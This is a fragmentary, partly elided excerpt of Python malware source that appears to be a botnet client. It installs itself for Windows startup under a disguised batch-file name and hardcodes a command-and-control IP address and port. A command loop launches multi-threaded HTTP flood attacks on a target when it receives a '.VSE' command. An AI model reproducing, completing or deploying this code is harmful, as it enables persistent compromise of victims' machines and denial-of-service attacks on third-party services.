...
def add_to_startup(file_path=""):
    ...
    with open(bat_path + '\\' + "SystemNetworkLib.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
        
C2_ADDRESS  = '51.250.71.41'
C2_PORT     = 1337
    ...
    while 1:
        try:
            ...
            if command == '.VSE':
                ...
                for _ in range(os.cpu_count()):
                    threading.Thread(target=attack_http, args=(tarurl, port, secs), daemon=True).start()
